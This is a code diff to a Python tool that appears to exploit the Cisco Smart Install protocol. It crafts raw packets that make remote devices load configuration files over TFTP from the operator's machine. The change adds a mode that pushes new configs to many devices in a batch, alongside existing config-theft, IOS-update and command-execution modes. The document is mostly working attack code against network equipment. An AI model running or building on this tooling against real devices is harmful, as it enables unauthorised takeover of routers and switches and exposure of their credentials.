@@ -27,6 +27,8 @@ def get_argm_from_user():  # Set arguments for running
                         help="Get cisco configuration file from device and store it in conf/ directory")
     parser.add_argument("-c", "--change_config", dest="mode", const="change_config", action="store_const",
                         help="Install a new configuration file to the remote device")
+    parser.add_argument("-C", "--change_multi", dest="mode", const="change_multi", action="store_const",
+                        help="Install new configuration files to multiple remote devices")    
     parser.add_argument("-u", "--update_ios", dest="mode", const="update_ios", action="store_const",
                         help="Updating IOS on the remote device")
     parser.add_argument("-e", "--execute", dest="mode", const="execute", action="store_const",
@@ -222,6 +224,18 @@ def change_tftp(mode, current_ip):  # Send package for changing tftp address
         sTcp = sDump1 + ('%02x' % int(sTime[0:2])) + '0' * 6 + ('%02x' % int(sTime[3:5])) + '0' * 264 + fConf.encode(
             'hex') + sDump2
 
+    elif mode == 'change_multi':
+        if not os.path.isdir("tftp/conf") and not os.path.exists("tftp/conf"):
+            os.mkdir('tftp/conf', 0755);
+        config_file = 'conf/' + current_ip + '.conf'
+        fConf = 'tftp://' + my_ip + '/' + config_file
+        sTime = '00:01'
+
+        sDump1 = '0' * 7 + '1' + '0' * 7 + '1' + '0' * 7 + '3' + '0' * 5 + '128' + '0' * 7 + '3' + '0' * 23 + '2' + '0' * 15 + '1' + '0' * 6
+        sDump2 = '0' * (264 - len(fConf) * 2)
+        sTcp = sDump1 + ('%02x' % int(sTime[0:2])) + '0' * 6 + ('%02x' % int(sTime[3:5])) + '0' * 264 + fConf.encode(
+            'hex') + sDump2
+
     elif mode == 'get_config':
         # need more test with this payload ( "system:" may be more usefull then "nvram:"
         # c1 = 'copy nvram:startup-config flash:/config.text'
@@ -269,7 +283,6 @@ def change_tftp(mode, current_ip):  # Send package for changing tftp address
 
 def main():
     args = get_argm_from_user()
-
     if args.mode == 'test':
         if args.list_IP:
             hosts_to_scan_queue = queue.Queue()
@@ -297,11 +310,11 @@ def main():
     else:
         tftp = subprocess.Popen(["python", "sTFTP.py"])
 
-        if args.mode != 'get_config':
+        if args.mode != 'change_multi' and args.mode != 'get_config':
             current_ip = args.IP
             change_tftp(args.mode, current_ip)
 
-        elif args.mode == 'get_config':
+        elif args.mode == 'change_multi' or args.mode == 'get_config':
             if args.IP:
                 current_ip = args.IP
                 change_tftp(args.mode, current_ip)
@@ -340,8 +353,10 @@ def main():
                 except KeyboardInterrupt:
                     print('[INFO]: You pressed Ctrl+C, exit.')
                     exit()
-
-            print('[INFO]: Getting config done')
+            if args.mode == 'get_config':
+                print('[INFO]: Getting config done')
+            elif args.mode == 'change_multi':
+                print('[INFO]: Packet sent, next')
 
         else:
             print('[ERROR]: Choose the tool mode (test/get_config/change_config/update_ios/execute)')
@@ -352,3 +367,4 @@ def main():
 
 
 main()
+
